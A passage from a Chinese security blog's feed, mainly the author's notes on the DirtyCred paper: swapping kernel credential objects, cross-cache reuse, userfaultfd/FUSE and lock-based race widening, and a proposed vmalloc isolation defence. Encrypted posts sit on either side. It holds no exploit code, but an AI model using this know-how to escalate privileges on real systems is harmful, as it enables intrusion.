11082e4a3977415e44b4fc87e64d5d3b66ee91d4fa2f18c6c23c9b6266aab18c8261e5b25f387fb13d8fa8cba45d486393f28ec5a767a36f1cf66c8e7dd29acf207b9cac9eee2caf7bf4dc336e5dd2fb4b9e9959eb67d6987c8c4f54c2206655b268d4ab2f5c9589e6c8c4fce0134f01f97c1b555ce620bb04c47aab6d8200e9076504e43d55d3ca2c2b07313ff8aa1641d373c16340751ffe3e6d2e099debdce45e77ae7afc08b4edc4aa6893f30f4503c7cd287ce4e9fcfa303de87dee4fa840bb285a149433df0aeb5031a235d87754a571c9b6010e83b3efedac3fb5f2ad83701c1a405ea2597d82d4b72909491e86e4a2375cc6bc1b722b44d43fcbbdb7a0df54f083a4076604e00f36817ca9af79d4be468da2b0a45581016d21c744c84a6959bf894a3d7b54e3fd4d2bfa89a239af81a724ba4814280ced0ec71fec4c4657251da14d53e574159795c42651f58ae54286d6eab48f9c6dfc6e051f5a4c50620288e08cd21bfd3314b4f685f6c79e50bc63fa51e6e3c2089dadb24d13629ec7970c41d3e3309a50840aaf4e753e6b2b4bf3b87a00f3c0a05e0ac14884cbfd8d11265e0450b1321e578755becb18d03de7c83fc54296b814ee360faa886a0a5c4f8a76f816da7151bf913dda914456091e1133b559a4d227c1b43bd74a74f2ad4b867fc2a7494b127b0169fe24817656cae8610bc41d63fac3756a7081a3e53c357da89b8e24f3ab0951df1e02fef485245cc525515b544ab56a2b1b149c46914273f0c623ad1843481edec9f5f62af329b398359de561712c3ca58105f57179985c36fc3670fbbd79fb0bf510ef60ae5b1712b4b4bc24925028dfbe9441fa269cd682bd4d4d4ccc2e364fc1491319a362c8d0ea1fdf0327f0bb8eb5cc47d8f44bb81c8a5bb576864db7a44b2bc766ddfe9bac014e399cbe59f11c6409f2178b30cc360d8d0fbfa3cb41d0b074244f825c65ac38dbeefd653cd60a18ed7c2acff6ebad180415bb9b741bfb278ea49c8dd8edaa527b47bd3c1237cac5d3341a214441e11fba52e12043a952c5f4f2afb44183b5db7059f9280d1fdea3dc4fa700618c1d2d626fb0fb39fad527541065d055e7e26efe51495c9d34053f07f4eba88bf8679702f1d929558961afe3cc74b9428fb9c8b657de2328e074f8c110729111f1a279dfed12f82c997f60aec494900e10d37943ab3564907430921244ed350c6cd79bc39e80d3cdeaa3e490dab10cabcb1d3c17da34edf6aff1b78e132d9699d1171ddafcfde4b4702c20ca0100067a928089fdf5e09789c4efb3a2c895ee9023015b0208b1e4c3a6ae47618c85010cedfe59f6fa351c3a971263f54ea076d400944ae2f9eea130bec7a31d1105b9681d4d99cbbe40d1ad90c79159de10ffe0a340641268778e8a3d49ee7b08d402aaa1539120a9fda5c05e98aea5827a31f5bacd57ad94a3bf76a1e6620260130907e0d11becd2c37d68f11c78673c3806177b5aece9acd2733fd9252469f812fab8c8e3b3c559aef3d1211a4d5fbc6c82eb15c21c50769f28697a4c47f716475ee9bc4d3198e74b658c9188cc90324a207b53ab13f20a4018692629a370e8cdc764c5a2e1568349efd053ddfd1f191dcc53115b7a72fabc6be61a360ee6544102a14fa85136dcb465444d2548258b441feb4ba770f210c542c348267f86e085e2e18d57c7295d9cee9bada6d0077a161515e39e59281edc821aecc29c2d659d18e16655476e3c37908c5bb9d89aa6cf606fb73c7c60e46967825e2fc3290f60a8003de47ec3755da92ad0e321a88b63782acae1c3ce4015d4362ed3dc1a68b6d0821a4e3466f9593fb91ab2e5a5135c797c257f4c3c9058d84a17d6969949dcb5d212bf2f61f8267c660791fe26181f053f0a4a738617a41fa6a157bafca80011434c8da03721f7f70428902d591f4bb6cdcfaa1bb714dd3ce6e77dd061e332e5264ea4b2e0d2a574d67f29d2d82f79ed252508cf83f47281be217cff89f999199505b97fca7764de031e5967d20aa0f89a678101df030e83b54f2541c90fbe34f24652379429b9cd641937e2b111209bb1865dfa41f6b471cfcd0ed6878884e9a053c27bf114c233b3db2772b68f2645b1c77b87b39505fdead4ffaab1e8cc609f33e75aa94e3061427395ca6def14508ee75e81fde8bc94bd1a6181c67e1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">没写完，别急，急的话可以先看先知上的半成品</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">本文首发于先知社区：https://xz.aliyun.com/t/12439</summary>
    
    
    
    <category term="VIRUS" scheme="https://arttnba3.github.io/categories/VIRUS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="RootKit" scheme="https://arttnba3.github.io/tags/RootKit/"/>
    
    <category term="Virus" scheme="https://arttnba3.github.io/tags/Virus/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x05】论文笔记：DirtyCred: Escalating Privilege in Linux Kernel</title>
    <link href="https://arttnba3.github.io/2023/12/31/PAPER-0X05-DIRTY_CRED/"/>
    <id>https://arttnba3.github.io/2023/12/31/PAPER-0X05-DIRTY_CRED/</id>
    <published>2023-12-30T19:34:16.000Z</published>
    <updated>2023-12-30T09:00:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>新瓶装旧酒的 114514 种写法</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>DirtyCred 在 <a href="https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf">blackhat usa 2022上的演讲 ppt</a> 和<a href="https://zplin.me/papers/DirtyCred.pdf">发在 CCS 上的论文</a>笔者很早就看过了，简而言之这个利用手法的思路其实算是比较容易理解的，所以理论上来说并没有必要专门写一篇博客，但是最近刚好需要做关于 DirtyCred 的技术分享，以及 12 🈷笔者暂且一篇技术型博客都还没有写，为了不破坏<a href="https://arttnba3.cn/2000/10/12/hello-world/#About-the-blog">曾经给自己定下来的规矩</a>，笔者决定简单水一篇关于 DirtyCred 的博客：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">DirtyPipe</a> 在安全社区引起了一阵狂欢，但这个手法限制太多了，因此作者给出新的类似的利用方法——<code>DirtyCred</code> ，通过篡改<strong>凭证</strong>（credential）结构体来进行利用，同时作者还给出了防范手段</p><p><strong>KEYWORDS</strong>：OS Security; Kernel Exploitation; Privilege Escalation</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><p>Linux 对于黑客们而言非常流行，但 KASLR、CFI 等防护手段让利用变得困难，因此 <a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">CVE-2022-0847</a> （DirtyPipe）的出现引发了热潮——她不需要与众多内核防护措施，但仍存在不够普适的缺陷</p><blockquote><p>笔者注：这里作者为了抬高自己的手法在前面贬低了一嘴 DirtyPipe 做铺垫，但其实将漏洞转换为 DirtyPipe 已经是非常常见的利用方式了，就笔者所知 DirtyPipe 比 DirtyCred 实际上<strong>适用性是更加广泛的，现在在 CTF 与真实世界漏洞利用中大家都倾向于将漏洞转为 DirtyPipe、而并非 DirtyCred 进行利用</strong>， <del>但是为了发论文嘛肯定得自吹自擂一手</del></p></blockquote><p>本文提出一种通用利用手法——<code>DirtyCred</code> ，其并不基于管道机制或是 CVE-2022-0847，而是通过堆漏洞将低权限的 credentials 结构体替换为高权限的 credentials，简而言之本文贡献如下：</p><ul><li>提出了新的利用手法 DirtyCred，其可以规避许多内核保护机制</li><li>证明了 DirtyCred 可以在真实世界漏洞中广泛进行利用</li><li>分析现有内核保护机制并设计出了一种新的保护机制</li></ul><h1 id="0x02-Background-Threat-Model"><a href="#0x02-Background-Threat-Model" class="headerlink" title="0x02. Background &amp; Threat Model"></a>0x02. Background &amp; Threat Model</h1><h2 id="2-1-Credentials-in-Linux-kernel"><a href="#2-1-Credentials-in-Linux-kernel" class="headerlink" title="2.1 Credentials in Linux kernel"></a>2.1 Credentials in Linux kernel</h2><p><strong>凭证</strong>（credentials）指内核中包含权限信息的东西，在 Linux 内核中被实现为带有权限信息的内核对象（包括 <code>cred</code>、<code>file</code>、<code>inode</code>，本文仅用前两个因为第三个仅会在创建文件时被分配）：</p><ul><li>Linux 内核中每个进程都有一个指向 <code>cred</code> 对象的指针，其中有着该进程的权限信息，如当进程要访问文件时便会检查 cred 的 UID；cred 对象还描述了能力（capability），如 <code>CAP_NET_BIND_SERVICE</code> 说明了进程可以将一个套接字绑定到一个端口上</li><li>Linux 内核中每个文件都有着对应的权限设置，且与 inode 对象绑定，在进程要打开文件前内核会调用 <code>inode_permission</code> 检查权限，在文件打开后 <code>file</code> 对象用以记录权限设置</li></ul><h2 id="2-2-Kernel-Heap-Memory-Management"><a href="#2-2-Kernel-Heap-Memory-Management" class="headerlink" title="2.2 Kernel Heap Memory Management"></a>2.2 Kernel Heap Memory Management</h2><blockquote><p>建议看 <a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">【OS.0x04】Linux 内核内存管理浅析 III - Slub Allocator</a></p></blockquote><p>内核堆对象有两种缓存池：</p><ul><li><strong>通用缓存</strong>（Generic Caches）：相同大小的都能从这类池中进行分配</li><li><strong>专用缓存</strong>（Dedicated Caches）：出于安全与性能目的考虑设计的仅供某些结构体分配的池</li></ul><h2 id="2-3-Threat-Model"><a href="#2-3-Threat-Model" class="headerlink" title="2.3 Threat Model"></a>2.3 Threat Model</h2><p>作者假设非特权本地用户可以访问 Linux 系统，目的是利用堆内存损坏漏洞进行提权，并假设上游（5.15）所有缓解措施与保护机制都已启用（包括KASLR、SMAP、SMEP、CFI、KPTI 等）</p><h1 id="0x03-Technical-Overview-Challenges"><a href="#0x03-Technical-Overview-Challenges" class="headerlink" title="0x03. Technical Overview &amp; Challenges"></a>0x03. Technical Overview &amp; Challenges</h1><h2 id="3-1-Overview"><a href="#3-1-Overview" class="headerlink" title="3.1 Overview"></a>3.1 Overview</h2><p>作者使用 CVE-2021-4154 作为例子说明 DirtyCred，这是一个 <code>fs_context</code> 对象错误引用 <code>file</code> 对象所导致的类型混淆错误，这允许将正在使用中的 <code>file</code> 进行释放</p><p>如图 1 所示：</p><ul><li>首先打开可写文件 <code>/tmp/x</code> 分配一个 <code>file</code> ，之后尝试进行数据写入，权限检查通过，之后 DirtyCred 将文件写入暂停</li><li>接下来触发漏洞将 <code>file</code> 结构体释放</li><li>之后打开只读文件 <code>/etc/passwd</code> 重新取回该 <code>file</code> 对象，并恢复数据写入，此时便成功完成越权写</li></ul><p>该例子只是用来说明 DirtyCred 如何利用 file 结构体进行利用，如 Section 2 所言，除了 <code>file</code> 以外，<code>cred</code> 也可以作为利用对象</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230070520.png"></p><p>从真实世界案例中可以看出 DirtyCred 不会劫持控制流，本质上是操纵内存中的内核对象，因此许多现有的控制流防护手段无法进行防御，一些工作（如 <a href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game/">AUTOSLAB</a>）则在对抗 DirtyCred，但如第 8 节所言其仍无法防御这种手段</p><h2 id="3-2-Technical-Challenges"><a href="#3-2-Technical-Challenges" class="headerlink" title="3.2 Technical Challenges"></a>3.2 Technical Challenges</h2><p>DirtyCred 仍面临一些挑战：</p><ul><li>DirtyCred 需要 invalid-free capability 去释放掉一个低权限对象并重新分配为高权限对象，这种能力通常难以获得，因此 DirtyCred 需要将漏洞的不同能力转为所需能力，我们将在第 4 节进行描述</li><li>DirtyCred 需要暂停文件写入操作，这同样是一个挑战，我们将在第 5 节中介绍可以达成该目标的多种机制</li><li>DirtyCred 的关键步骤是要用高权限凭证替换掉低权限的，但对于低权限用户而言分配高权限凭证也是一个挑战，我们将在第 6 节中给出解决方案</li></ul><h1 id="0x04-Pivoting-Vulnerability-Capability"><a href="#0x04-Pivoting-Vulnerability-Capability" class="headerlink" title="0x04. Pivoting Vulnerability Capability"></a>0x04. Pivoting Vulnerability Capability</h1><blockquote><p>Pwn 人基本功了嗷，憋和👴说你不会嗷</p></blockquote><p>虽然 CVE-2021-4154 展示了 DirtyCred 的威力，但实战中我们并不一定有这样的能力，因此我们需要进行能力转换（笔者注：漏洞迁移的概念）</p><h2 id="4-1-Pivoting-OOB-UAF-Write"><a href="#4-1-Pivoting-OOB-UAF-Write" class="headerlink" title="4.1 Pivoting OOB &amp; UAF Write"></a>4.1 Pivoting OOB &amp; UAF Write</h2><p>如图 2 所示，我们可以通过 partial overwrite 将包含指向凭证对象的指针的内核对象进行复写，使得两个指针指向同一个凭证对象，从而进行 DirtyCred，由于堆喷连续分配的结构体通常分组来自相同 slab，因此可行性很高</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230072228.png"></p><h2 id="4-2-Pivoting-DF"><a href="#4-2-Pivoting-DF" class="headerlink" title="4.2 Pivoting DF"></a>4.2 Pivoting DF</h2><p>通用缓存（如 <code>kmalloc-96</code>）与专用缓存（如 <code>cred_jar</code>）间存在隔离，但我们可以通过释放缓存页面并重新分配的方式使得跨缓存的内存操作成为可能，如图 3 所示，我们先分配大量对象，通过漏洞我们有两个指针指向同一对象，在大量分配后我们将其大量释放，并保留一个垂悬指针，之后再分配为凭证结构体对象，以此进行 DirtyCred</p><blockquote><p>笔者注：这个手法也出现在笔者近期供给某些 CTF 比赛中的 kernel pwn 题中，可惜怎么都是 0 解（恼）</p></blockquote><p>但如图 3(f) 所示，漏洞对象大小不一定匹配凭证对象大小，从而无法 DirtyCred，这种情况下我们需要保有两个指针，将其中一个释放掉从而构造出空内存槽以分配为凭证结构体，再进行释放以获取所需能力</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230072544.png"></p><h1 id="0x05-Extending-Time-Window"><a href="#0x05-Extending-Time-Window" class="headerlink" title="0x05. Extending Time Window"></a>0x05. Extending Time Window</h1><p>DirtyCred 需要我们延长权限检查到写入之间的时间窗口</p><h2 id="5-1-Exploitation-of-Userfaultfd-FUSE"><a href="#5-1-Exploitation-of-Userfaultfd-FUSE" class="headerlink" title="5.1 Exploitation of Userfaultfd &amp; FUSE"></a>5.1 Exploitation of Userfaultfd &amp; FUSE</h2><blockquote><p>简而言之长话短说可以参见<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd%EF%BC%88may-obsolete%EF%BC%89">这里</a></p></blockquote><p>userfaultfd 允许我们在用户态手动处理缺页异常，FUSE 允许我们实现用户空间文件系统，这为延长时间窗口提供了可行性，如读写注册了 userfaultfd 的内存页或是读写 FUSE 文件来触发我们的自定义 handler 函数</p><p>下面我们以 userfaultfd 为例（FUSE 利用方式类似），DirtyCred 通过系统调用 <code>writev()</code> 进行文件写入，不同于 <code>write()</code> 系统调用，其使用 <code>iovec</code> 向量来传递数据，如 List 1 所示，4.13 版本前的系统调用 <code>writev()</code> 首先进行权限检查，之后再通过 <code>iovec</code> 向量导入用户空间数据，最后才是写入，因此 DirtyCred 可以很轻易地使用 userfaultfd 的特性来获得合适的时间窗口</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230164326.png"></p><p>这项技术初见于 <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808">CVE-2016-4557</a>，但现在已不再可用</p><h2 id="5-2-Alternative-Exploitation-of-Userfaultfd-FUSE"><a href="#5-2-Alternative-Exploitation-of-Userfaultfd-FUSE" class="headerlink" title="5.2 Alternative Exploitation of Userfaultfd &amp; FUSE"></a>5.2 Alternative Exploitation of Userfaultfd &amp; FUSE</h2><p>如 List 2 所示，在内核版本 4.13 之后导入 <code>iovec</code> 向量的步骤被移动到了权限检查之前，这使得我们不再能扩大权限检查与文件写入间的时间窗口，为了解决这个问题，DirtyCred 将利用 Linux 文件系统的设计</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230164938.png"></p><p>内核文件系统的设计遵循严格的层次关系，高层接口统一而低层接口各异，写入文件时会调用高层接口，如 List 3 所示， <code>generic_perform_write()</code> 为统一的高层接口，在第 15 ~ 17 行其会调用对应文件系统的写入操作，出于性能考虑内核在写入前会拷贝 iovec 向量数据，从而触发缺页异常，由此 DirtyCred 可以在第 10 行使用 userfaultfd 来延长时间窗口</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230201446.png"></p><p>与通过导入 <code>iovec</code> 来暂停内核的执行相比，对文件系统的设计进行利用则更难被缓解，如 List 3 中注释所言，移除 iovec 的 page fault 有可能造成死锁；将 page fault 移到权限检查前可能解决问题，但这会对性能造成影响，且仍存在潜在的被绕过的可能，如 DirtyCred 可以在 paeg fault 之后再移除该页，从而在拷贝时再次 page fault 以暂停（<del>有点扯了</del>）</p><h2 id="5-3-Exploitation-of-Lock-in-Filesystem"><a href="#5-3-Exploitation-of-Lock-in-Filesystem" class="headerlink" title="5.3 Exploitation of Lock in Filesystem"></a>5.3 Exploitation of Lock in Filesystem</h2><p>Linux 文件系统存在锁机制（如 List 4 为 ext4 中的锁），这为 DirtyCred 创造了机会，我们可以创建两个进程 A 与 B 同时写入同一文件，在 A 持有锁进行写入时 B 陷入等待，而在 <code>generic_perform_write()</code> 之前权限检查早已完成，由此 DirtyCred 可以通过写入大量数据来创造一个较长的时间窗口以完成 file 的替换（据作者观察写入 4GB 文件大概需要好几秒）</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230203419.png"></p><h1 id="0x06-Allocating-Privileged-Object"><a href="#0x06-Allocating-Privileged-Object" class="headerlink" title="0x06. Allocating Privileged Object"></a>0x06. Allocating Privileged Object</h1><p>DirtyCred 需要在内核空间分配特权对象，本节叙述如何以一个低权限用户做到这一点</p><h2 id="6-1-Allocation-from-Userspace"><a href="#6-1-Allocation-from-Userspace" class="headerlink" title="6.1 Allocation from Userspace"></a>6.1 Allocation from Userspace</h2><p><code>cred</code> 对象代表了对应内核进程的权限，因此 DirtyCred 可以通过执行 root-SUID 程序来创建 root 进程（而不用寻找这类程序中的漏洞），这样的程序包括 sudo、pkexec 等</p><p>DirtyCred 除了替换 <code>cred</code> 对象以外也可以通过替换 <code>file</code> 对象来提权，不过 <code>file</code> 对象的分配远比 <code>cred</code> 容易，以对应权限打开文件即可</p><h2 id="6-2-Allocation-from-Kernel-Space"><a href="#6-2-Allocation-from-Kernel-Space" class="headerlink" title="6.2  Allocation from Kernel Space"></a>6.2  Allocation from Kernel Space</h2><p>除了从用户空间分配特权对象以外，DirtyCred 也可以从内核空间分配特权对象，如生成新的特权内核线程完成特权凭证对象的分配，主要有两种方式：</p><ul><li>调用内核代码触发内核在内部生成特权线程，如通过向 <a href="https://docs.kernel.org/core-api/workqueue.html">工作队列</a> 提交任务让内核创建新的工作者线程</li><li>唤醒 usermode helper，如通过加载内核模块来让内核启动特权用户态 usermode helper 程序（如 modprobe）</li></ul><h1 id="0x07-Evaluation"><a href="#0x07-Evaluation" class="headerlink" title="0x07. Evaluation"></a>0x07. Evaluation</h1><p>作者设计了两个实验来在真实世界漏洞上评估 DirtyCred</p><h2 id="7-1-Experiment-Design-Setup"><a href="#7-1-Experiment-Design-Setup" class="headerlink" title="7.1 Experiment Design &amp; Setup"></a>7.1 Experiment Design &amp; Setup</h2><p>作者引入了一种自动化方法（设计实现参见附录 A）寻找可供 DirtyCred 利用的内核对象，并应用于 5.16.15 版本的内核</p><p>作者还探讨了针对实际漏洞利用的可行性，如第 4 节所言，若漏洞未直接提供交换凭证结构体的能力，则需要我们进行转换</p><p>作者假设 Linux 内核使用其最先进的防护手段，并在评估中仅选择 2019 年以后的 CVE，数据集如表 2 所示，这涵盖了几乎所有的堆上漏洞类型</p><h2 id="7-2-Experiment-Result"><a href="#7-2-Experiment-Result" class="headerlink" title="7.2 Experiment Result"></a>7.2 Experiment Result</h2><p><strong>可利用对象</strong>。表 1 展示了不同缓存池中可以被利用的内核对象，几乎所有通用缓存池（除了 <code>kmalloc-8</code> ）都有可供 DirtyCred 利用对象：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230204803.png"></p><p><strong>可利用性</strong>。表 2 显示了 DirtyCred 在不同漏洞上的可利用性，在开启所有防护的情况下其在 24 个漏洞中的 16 个上都完成了利用，这表明了其通用性与强大</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230205513.png"></p><blockquote><p>还有一些关于利用失败的阐述，这里笔者就不抄了</p></blockquote><h1 id="0x08-Defence-Against-DirtyCred"><a href="#0x08-Defence-Against-DirtyCred" class="headerlink" title="0x08. Defence Against DirtyCred"></a>0x08. Defence Against DirtyCred</h1><p>现有各种防护主要针对控制流劫持，难以对抗 DirtyCred，作者认为一种有效的对抗方式是隔离高权限与低权限对象，比较直接的想法是创建不同的缓存池，但这仍能通过跨缓存的页回收完成利用</p><p>基于上述考虑，作者设计的解决方案是为高权限对象在虚拟内存区域创建一个缓存（创建的凭证对象 ID 为 <code>GLOBAL_ROOT_UID</code> 时或以写权限打开文件时则使用 vmalloc 分配），同时低权限对象保留在正常内存区域，从而隔离开内存页；但运行时权限更改（如 setuid 系统调用）仍能破坏这种机制，作者的解决方案是为更改操作添加检查，若是改为 <code>GLOBAL_ROOT_UID</code> 则将高权限凭证对象复制到 vmalloc 区域而非更改原始对象，但这需要未来的内核开发遵循相同的模式，因此作者仍在探索替代解决方案</p><p>性能评估结果如表 3 所示：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230210827.png"></p><p>在这项工作中，作者称其主要目标是提高Linux社区的意识，而不是构建一个安全、高效的防御解决方案，且作者将探索替代防御解决方案作为未来研究的一部分</p><h1 id="0x09-Related-Work"><a href="#0x09-Related-Work" class="headerlink" title="0x09. Related Work"></a>0x09. Related Work</h1><p>这一节主要介绍与论文相关的两方面工作——内核利用（exploitation）与内核防护（defence），都是常识性内容所以这里笔者就不摘抄了：）</p><h1 id="0x10-Discussion-Future-Work"><a href="#0x10-Discussion-Future-Work" class="headerlink" title="0x10. Discussion &amp; Future Work"></a>0x10. Discussion &amp; Future Work</h1><p>这节讨论之前没提到的一些点：</p><ul><li><p><strong>Escaping container.</strong> 容器中的文件并不提供交换命名空间的能力，但<a href="https://www.datadoghq.com/blog/engineering/dirty-pipe-container-escape-poc/">一项最近的研究</a>显示攻击者可以被动等待 runC 进程，由此可以通过覆写进程来在 host 侧以 root 运行命令，DirtyCred 可以以此完成容器逃逸；利用 cred 对象则不需要被动等待，通过交换 cred 获得 <code>SYS_ADMIN</code> 权限使得攻击者可以挂载 cgroup 后利用 <code>notify_no_release</code> 机制来在 host 侧以 root 执行命令，作者在<a href="https://hackmd.io/giRE2P2oQHektZzOG053IQ">这里</a>给出了案例</p></li><li><p><strong>Rooting Android.</strong> 安卓也是 Linux 内核，DirtyCred 可以通过文中讨论的两种方式完成安卓提权，不过实战中安卓内核有着更严格的访问限制，直接交换 cred 是可行的，对于文件而言可以首先覆写共享库以完成沙箱逃逸，之后再覆写内核模块，作者在 0day 漏洞上用 DirtyCred 完成了利用并获得更Google 的致谢</p></li><li><p><strong>Cross version&#x2F;architecture exploitation.</strong> DirtyCred 的利用是跨版本跨架构的，因为其基本不需要内核信息，也不需要特定于架构的数据</p></li><li><p><strong>Other way to pivot capability.</strong> 虚拟内存区上的漏洞更难被转化为 DirtyCred，但不意味着无法使用 DirtyCred，如<a href="https://github.com/HexRabbit/CVE-writeup/tree/master/CVE-2021-34866">这个工作</a>将 vmalloc 区上的越界写漏洞 CVE-2021-34866 转为任意内存读写</p></li><li><p><strong>Stability.</strong> 稳定性主要受内存布局与漏洞触发方式影响，<a href="https://www.usenix.org/conference/usenixsecurity22/presentation/zeng">最近的一个工作</a>提出了一系列方法提高利用稳定性</p></li><li><p><strong>TOCTOU.</strong> （Time-Of-Check to Time-of-Use） DirtyCred 在关键时间窗口交换凭证对象，直觉告诉我们现有的 TOCTOU 防御方法可能会阻碍 DirtyCred，但针对<a href="https://ieeexplore.ieee.org/document/9718065/">最近一篇关于 TOCTOU 的研究文章</a>分析，实际上并不会，因为 DirtyCred 使用了意外的释放操作，而这在各种分析过程中不可见</p></li></ul><h1 id="0x11-Conclusion"><a href="#0x11-Conclusion" class="headerlink" title="0x11. Conclusion"></a>0x11. Conclusion</h1><p>作者开发了 Linux 内核通用利用手法 DirtyCred，很好很强大，撒花~🌸🌸🌸</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;新瓶装旧酒的 114514 种写法&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x05】过量电波重度依赖：再别电专</title>
    <link href="https://arttnba3.github.io/2023/12/21/PIECES-0X05-NEEDY_A3_OVERDOSE-0-GOODBYE_XDU/"/>
    <id>https://arttnba3.github.io/2023/12/21/PIECES-0X05-NEEDY_A3_OVERDOSE-0-GOODBYE_XDU/</id>
    <published>2023-12-20T19:30:41.000Z</published>
    <updated>2023-12-30T10:45:56.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码出错啦！但是题目还没出好所以暂且请等待..." data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="4de51144639fa16a8ecbdfa6582d90c8d1f285c11113223e663031ab4ef51287">f4186fb4192fa911fd4cd5c6f8b3def692d6faa5b6d746477cdf302dc764b950561e745c78f1c2766333c32886c5952b6e980ae7cf9867d465b2910ea68de50562b3d6037eb63a410a04c38f48922f102bb2f4b3db916837be31b0411cc81c5bcd8a92d70a5115129535e22060e291d45a9ee6aeb5facae4ca490abfcd362eeb9b4f732a53ed084f4bcec789cd881ff4c5e061e10609c659b0fa03a0059e40c04e7de63cdd73a94cfb68a11991ba5951d7162b02b9755c65e49e6b1f4d013ae0a220731d448c29a2f3da06ddc23308e787f46607e7f90f66a005af1b876ee2d42e9fc90aa80bababaf545fdaaec8467928a580c60b3d93bb14533c398a46f3d1f16d104b2ec855562677e6b0b8e949ffbcde6a581684bd4b3e83400f9d9d9369a047793a9cf039dcbb07a089c872773ad25033b8c8ecd6280d163bd3810aab1ac97d731bef2b25e898ab0ae64e99e1f8bd51fbdd9b7f7e1219137347672122b962819a62d63160ea2c853a130e7c53519c3cca2b7d61c18f427b09f3db01cfa5fdca0080c2d3d78353676b9b495714c5eded101a1a89a210717899a948835d8e41e82715935a5da67588e3fa86fc6fe490a0b7e2b4cbfd1a6ef02a9d68aea9043e6eab7207493412f4e2327205009a76c3afe25dd58b1ed0a0e9308da21b2c2944c916ccc700e3e85a35fce8f2ab7f560dd826205ad5985bca2020a6ecdc56d4a54e3ffa27cdd8db1678b1806ee205ad6c1db5b4d9e4b63da59fbc84ca252e2ae5ebc4556116dd4b6af7e6b3898922ffa8417368c5b0499f744d52de6e05a6b2188b70efa8c2320da88d085a4cdc6779a50f069e6aea4b20f66992d345a4d165cccb6384ad2bf2c8d2122a6912719af6487a14b53f6c46ba6f6a9c769a6a9a75e54de141ddc8c902df0818f1e2fde45a32f32cc809a751f5a61d8161be5f14c9863aee5bf029bb1ca5e09d1c027ec4d10975933845acb5f9b1c4455a73cb256803b1704097de257df417cb9776858370edc1fe614e5a1077704177b11cca54bee14c3745e92605329be1d266e3351d016692f6be7e4f3bf74b77065f45c9b22c1085e535cce4fbcdabcd3348f065df16bda887d6268e2efe6ba74028d77966f31356148da14496374014d2f13d72979fabcfdd900f89806d886349678dd8eecf1ac534e168fcf3089bb3deb767b0653a3dfb12df72b8aa74f9e973bc4eac5282109448887fb0903b7607209bac87f2f0cb54f4997c211d5b6e0829a97df025ec1a7553ddc1c7a7a306dccb0ba72e24d5ef856982ca30838ddefd9bf6ff81a613167f2257a05826b872a0e48aee9b3587cec4768afb8047d49a1ee5efd95f7a2d191d09c744e2a08ecc8153109a8abc2d463634b5a995f46683325ca12debaa92e2ac8acc987e025de95957eab0b6c4e10a67cac2d83432f10fd4a5bbdcb9acd414b61f307d3ce5816d3ac266933635d55897a620c77af283a168e35aad6fc239cf4a74d9f6b61041cad19655b44e95a25490d283584f97f95255624e2e0b3c5fb267142a9b220c402961e0c13478aa0071c2e37e8a87427e899593d99de1e526c9a6c1e08b33c677365c5d7172bf94453255472d0e6127716e58f82dc0cd0a2dcc2ef8d727b39773fb687ce55d70cc80737e7fb3615797b9aead724767f0875b495391d7fc52e0f17bd055a762b0298cab1803844db6eabe401ca24656df5e93